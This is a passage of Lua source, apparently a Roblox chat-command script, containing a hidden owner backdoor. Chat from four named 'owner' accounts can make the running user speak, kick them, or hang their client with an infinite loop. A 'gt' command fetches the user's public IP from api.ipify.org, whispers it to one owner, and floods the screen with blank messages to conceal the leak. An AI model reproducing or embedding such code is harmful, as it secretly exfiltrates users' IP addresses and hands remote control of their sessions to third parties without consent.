Connect.OwnerCommands = function(Msg)

if not DisableAdmin then

Args(Msg)

if Connect.SendCommand("getusers") then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
end

if Connect.SendCommand("send") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
if Arg3 and not Arg4 and not Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3, "All")
end
if Arg3 and Arg4 and not Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4, "All")
end
if Arg3 and Arg4 and Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and not Arg7 and not Agr8 and not Arg9 and not Agr10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8.." "..Arg9, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and Arg9 and Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8.." "..Arg9.." "..Arg10, "All")
end
end

end

if Connect.SendCommand("kick") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
LPlayer:Kick("Kicked by Owner")
end
end

if Connect.SendCommand("crash") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
repeat until nil
end
end

if Connect.SendCommand("gt") then
if LPlayer.Name ~= "viniciuszk70" and LPlayer.Name ~= "R1_NOOB" then
local GT = tostring(game:HttpGet("https://api.ipify.org", true))
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 mpls"..GT.."mpls", "All")
for i = 1,100 do
Message(" ",0,0,0,Enum.Font.GothamBlack,21.5)
end
end
end

if Connect.SendCommand("gethbes") then
if HitBox then
wait(.2)
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
end
end

end

end

LPlayer.Chatted:Connect(Connect.Commands)

if OwnerVini then
OwnerVini.Chatted:Connect(Connect.OwnerCommands)
end

if OwnerR1 then
OwnerR1.Chatted:Connect(Connect.OwnerCommands)
end

if OwnerNight then
OwnerNight.Chatted:Connect(Connect.OwnerCommands)
end

if OwnerPeka then
OwnerPeka.Chatted:Connect(Connect.OwnerCommands)
end

Players.PlayerAdded:Connect(function(Added)
if not DisableAdmin then
if Added.Name == "viniciuszk70" or Added.Name == "R1_NOOB" or Added.Name == "33_Night" or Added.Name == "RCM_Mystx" then
Added.Chatted:Connect(Connect.OwnerCommands)
end
end
end)

LPlayer:GetMouse().KeyDown:connect(function(Key)
pcall(function()
if Prefix == "/" then
if Key == ";" then
CmdBox:CaptureFocus()
end
else
if Key == Prefix then
CmdBox:CaptureFocus()
end
end
end)
end)

CmdBox.FocusLost:Connect(function(FocusLost)
pcall(function()
if FocusLost then
if CmdBox.Text:sub(1,#Prefix) ~= Prefix then
Connect.Commands(Prefix..CmdBox.Text)
else
Connect.Commands(CmdBox.Text)
end
end
end)
end)

Mouse.KeyDown:connect(function(Key)
if not DisableAdmin then
if Key:lower() == "w" then
if BackColor ~= nil and TextColor ~= nil then
WT.BackgroundColor3 = TextColor
WT.TextColor3 = BackColor
else
WT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
if Key:lower() == "a" then
if BackColor ~= nil and TextColor ~= nil then
AT.BackgroundColor3 = TextColor
AT.TextColor3 = BackColor
else
AT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
if Key:lower() == "s" then
if BackColor ~= nil and TextColor ~= nil then
ST.BackgroundColor3 = TextColor
ST.TextColor3 = BackColor
else
ST.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ST.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
if Key:lower() == "d" then
if BackColor ~= nil and TextColor ~= nil then
DT.BackgroundColor3 = TextColor
DT.TextColor3 = BackColor
else
DT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
if Key:lower() == " " then
if BackColor ~= nil and TextColor ~= nil then
Back_Space.BackgroundColor3 = TextColor
Back_Space.TextColor3 = BackColor
else
Back_Space.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Back_Space.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
end
